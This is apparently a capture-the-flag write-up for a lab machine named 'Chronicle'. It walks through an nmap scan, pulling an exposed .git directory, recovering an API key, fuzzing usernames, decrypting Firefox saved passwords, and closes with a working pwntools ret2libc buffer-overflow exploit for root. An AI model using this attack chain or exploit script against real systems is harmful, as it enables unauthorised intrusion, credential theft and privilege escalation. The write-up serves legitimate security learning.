---
date: 2021-05-01 00:07:51
layout: post
title: "Chronicle"
subtitle:
description:
image: /writeup/assets/img/chronicle/main.jpg
optimized_image:
category:
tags:
author:
paginate: false
---

Start with nmap scan 
```
nmap -T4 -p- 10.10.140.252
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 05:20 IST
Nmap scan report for 10.10.140.252
Host is up (0.42s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.67 seconds
```
This shows 3 ports are open with 2 of them hosting a website. Fuzzing for more pages and directories on the website hosted on port 80 gives a `/old` directory and fuzzing more within it gives `.git` directory.
Download the .git directory inside a empty directory using 
```
wget --continue  http://10.10.140.252/old/.git/ --recursive
```

Moving onto other website, there is a login endpoint that provides a login page
![placeholder](/writeup/assets/img/chronicle/login.png "login")
The login page does not seems to be working but the link to forgot page works and requesting for password reset using the input box does seem to send a request.

Looking at the request closely shows that a parameter in the body of request which says `key` is NULL and the response recieved shows that API Key is invalid.
![placeholder](/writeup/assets/img/chronicle/forgot.png "forgot")

Running `git log -p -2` in the directory in which .git was downloaded shows various commits that have removed the data from the directory and one such commit contains the API Key being used in the backend.
![placeholder](/writeup/assets/img/chronicle/key.png "API_Key")

Using the key in the forgot password request now shows invalid username. Fuzzing with the most common 10K usernames wordlist shows that one of the username "tommy" works and the endpoint gives the password of the user.

Use the username and password to login using ssh.

Searching for various things inside the system shows that the second user carlJ is having a unusual directory `.mozilla` inside his home directory. Moreover, the directory can be accessed by tommyV user.
Since firefox is present, it may contain saved passwords. So using the tool <a href="https://github.com/unode/firefox_decrypt">Firefox_Decrypt</a> by pointing it inside `.mozilla/firefox` shows 2 profiles and 2nd one asks for master password.
![placeholder](/writeup/assets/img/chronicle/firefox.png "Firefox")

Trying various common passwords like password,admin,etc reveals that the master password is `password1` and thus shows the password for carlJ user.

Switch to carlJ user with the extracted password. Inside the `mailing` directory in home directory of the user shows a SUID binary, that asks for some input and claims to send message.


This binary is vulnerable to ret2libc buffer overflow.
Using the following python code it can be exploited to get root shell.
```python
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```
